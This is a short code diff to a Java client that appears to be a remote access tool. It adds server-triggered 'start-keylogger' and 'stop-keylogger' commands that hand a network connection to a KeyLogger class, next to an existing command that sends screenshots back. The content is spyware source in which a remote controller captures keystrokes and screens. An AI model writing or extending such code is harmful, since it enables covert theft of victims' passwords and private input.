@@ -6,6 +6,7 @@ import java.net.Socket;
 import java.net.SocketException;
 
 import exception.ServerOfflineException;
+import keylogger.KeyLogger;
 import network.Connection;
 import network.Message;
 import utils.ClientUtils;
@@ -63,7 +64,10 @@ public class Client {
 
         switch(command) {
             case "start-keylogger":
-
+                KeyLogger.getInstance(connection).start();
+                break;
+            case "stop-keylogger":
+                KeyLogger.getInstance(connection).stop();
                 break;
             case "screen":
                 ScreenUtils.sendScreenshot(connection, false);
